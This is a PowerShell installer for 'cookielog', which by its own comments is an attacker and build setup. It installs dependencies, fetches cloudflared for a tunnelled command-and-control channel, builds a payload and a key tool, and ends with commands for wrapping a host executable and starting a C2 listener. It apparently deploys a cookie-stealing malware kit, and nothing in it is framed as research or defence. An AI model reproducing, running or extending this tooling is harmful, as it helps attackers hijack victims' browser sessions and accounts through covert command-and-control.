# install.ps1 -- Windows setup for cookielog (attacker box and build box).
#
# The .bat installer covers the double-click case; this one is the short path a
# shell or CI uses. It checks the real toolchain (MSVC or clang-cl), installs the
# Python deps, fetches cloudflared for the --tunnel C2, and drives build.py.
#
#   .\install.ps1             deps + cloudflared + build if bin/ is incomplete + verify
#   .\install.ps1 -Build      force a rebuild of payload and keytool
#   .\install.ps1 -NoBuild    deps and checks only
#   .\install.ps1 -NoTunnel   skip the cloudflared download
#   .\install.ps1 -Check      install nothing, report, exit 1 when something required is missing
#
# Run from the cookielog directory.
[CmdletBinding()]
param(
    [switch]$Check,
    [switch]$Build,
    [switch]$NoBuild,
    [switch]$NoTunnel
)

$ErrorActionPreference = "Stop"
Set-Location -LiteralPath $PSScriptRoot

$script:Fail = $false

function Section([string]$Text) {
    Write-Host ""
    Write-Host "== $Text ==" -ForegroundColor Cyan
    Write-Host ("-" * 70)
}

function Have([string]$Name) {
    return [bool](Get-Command $Name -ErrorAction SilentlyContinue)
}

function Note-Fail([string]$Text) {
    Write-Host "[-] $Text" -ForegroundColor Red
    $script:Fail = $true
}

Section "[1/6] python"
$python = Get-Command python -ErrorAction SilentlyContinue
if (-not $python) {
    Note-Fail "python not on PATH"
    if (-not $Check) {
        if (-not (Have winget)) {
            Write-Host "    winget missing too; install Python 3.8+ from python.org"
            exit 1
        }
        Write-Host "[*] installing Python 3.14 via winget..."
        winget install --id Python.Python.3.14 -e --silent `
            --accept-source-agreements --accept-package-agreements
        Write-Host "[*] re-run this script in a new shell (PATH changed)"
        exit 0
    }
} else {
    $pyver = & python -c "import sys; print('%d.%d.%d' % sys.version_info[:3])"
    Write-Host "[+] python $pyver"
}
if (-not (Have python)) { if ($Check) { exit 1 } }

if ($Check) {
    Section "[2/6] report"
    & python build.py check
    & python build.py verify | Out-String | Write-Host
    $deps = $true
    & python -c "import cryptography, websocket" 2>$null
    if ($LASTEXITCODE -ne 0) { Note-Fail "pip packages missing"; $deps = $false }
    else { Write-Host "[+] pip packages: cryptography, websocket-client" }
    $cf = Join-Path $env:LOCALAPPDATA "cloudflared\cloudflared.exe"
    if (Test-Path $cf) { Write-Host "[+] cloudflared: $cf" }
    else { Write-Host "[*] cloudflared: not installed (only --tunnel needs it)" }
    if ($script:Fail -or -not $deps) { exit 1 }
    exit 0
}

Section "[2/6] python deps"
& python -m pip install --disable-pip-version-check -r requirements.txt
if ($LASTEXITCODE -ne 0) {
    Note-Fail "pip install failed"
    exit 1
}
Write-Host "[+] deps installed"

Section "[3/6] toolchain"
& python build.py check
$checkExit = $LASTEXITCODE
if ($checkExit -ne 0) {
    Write-Host "[-] payload artifacts incomplete" -ForegroundColor Yellow
    if ($NoBuild) { exit 1 }
}

Section "[4/6] cloudflared (--tunnel C2)"
$cfDir = Join-Path $env:LOCALAPPDATA "cloudflared"
$cfExe = Join-Path $cfDir "cloudflared.exe"
if (Test-Path $cfExe) {
    $cfVer = (& $cfExe --version) 2>$null
    Write-Host "[+] cloudflared: $cfVer"
} elseif ($NoTunnel) {
    Write-Host "[*] skipping cloudflared (-NoTunnel)"
} else {
    Write-Host "[*] downloading cloudflared (about 55 MB)..."
    New-Item -ItemType Directory -Force -Path $cfDir | Out-Null
    try {
        Invoke-WebRequest -UseBasicParsing `
            -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" `
            -OutFile $cfExe
        $cfVer = (& $cfExe --version) 2>$null
        if ($LASTEXITCODE -ne 0) { throw "cloudflared does not run" }
        Write-Host "[+] cloudflared installed: $cfVer"
    } catch {
        Note-Fail "cloudflared download failed: $_"
        Write-Host "    every other C2 mode still works; --tunnel needs it"
    }
}

Section "[5/6] build"
$needBuild = $Build
if (-not $NoBuild -and -not $needBuild -and $checkExit -ne 0) { $needBuild = $true }
if ($NoBuild) {
    Write-Host "[*] skipping build (-NoBuild)"
} elseif ($needBuild) {
    & python build.py all
    if ($LASTEXITCODE -ne 0) { exit 1 }
} else {
    Write-Host "[+] artifacts already complete (use -Build to rebuild)"
}

Section "[6/6] verify + tests"
& python build.py verify
if ($LASTEXITCODE -ne 0) { Note-Fail "verify failed" }
& python build.py test
if ($LASTEXITCODE -ne 0) { Note-Fail "unit tests failed" }

Write-Host ""
if ($script:Fail) {
    Write-Host "== not ready -- see the failures above ==" -ForegroundColor Red
    exit 1
}
Write-Host "== ready ==" -ForegroundColor Cyan
& python build.py hash
Write-Host ""
Write-Host "next:"
Write-Host "  python auto.py HOST.exe --tunnel          # https C2 without a VPS"
Write-Host "  python auto.py HOST.exe --run --tunnel    # local end-to-end test"
Write-Host "  python listen.py 9090                     # plain listener"
